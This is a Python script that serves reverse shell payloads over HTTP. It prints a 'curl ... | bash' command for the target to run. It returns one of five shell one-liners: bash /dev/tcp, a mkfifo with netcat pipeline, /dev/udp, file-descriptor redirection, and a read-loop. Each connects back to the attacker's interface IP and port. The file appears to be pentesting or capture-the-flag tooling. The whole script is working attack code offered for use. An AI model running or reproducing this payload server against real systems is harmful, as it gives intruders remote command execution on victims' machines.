#!/bin/python3
import requests
import http.server
import threading
import argparse
import sys
import socket
import fcntl
import struct
import argparse

class Server(http.server.BaseHTTPRequestHandler):

    def __init__(self, type, inet, rport):
        self.type = type
        self.inet = inet
        self.rport = rport
        print('serving reverse shell...')
        print(f'curl http://{self.get_ip_address(inet)}:{server_address[1]}/ | bash')

    def __call__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def do_GET(self):
        self.send_response(200);
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        shell = self.define_shell(self.type, self.inet)
        self.wfile.write(str.encode(shell))
        return

    def get_ip_address(self, ifname):
        string = '256s'
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(
            s.fileno(),
            0x8915,  # SIOCGIFADDR
            struct.pack('256s', bytes(ifname[:15], 'utf-8'))
        )[20:24])

    def define_shell(self, type, inet):
        ip = self.get_ip_address(self.inet)
        port = self.rport
        shells = {
        'std':f'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
        'mkfifo':f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ip} {port} >/tmp/f',
        'bash_udp':f'bash -i >& /dev/udp/{ip}/{port} 0>&1',
        'bash_5':f'bash -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5',
        'bash_rl':f'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'
        }
        return shells.get(self.type)


parser = argparse.ArgumentParser()

help_type = 'Set up type shell: standard | mkfifo | bash_udp | bash_5 | bashrl'

parser.add_argument('-t', '--type', help=help_type, default='std')
parser.add_argument('-i', '--inet', help='Set up the listening interface: tun0 | eth0 | enp4s0', default='tun0')
parser.add_argument('-p', '--port', help='Set netcat port listening', default='9001')

args = parser.parse_args()

server_address = ('0.0.0.0', 8080)
server = Server(args.type, args.inet, args.port)
httpd = http.server.HTTPServer(server_address, server)
thread = threading.Thread(target=httpd.serve_forever)
thread.start()

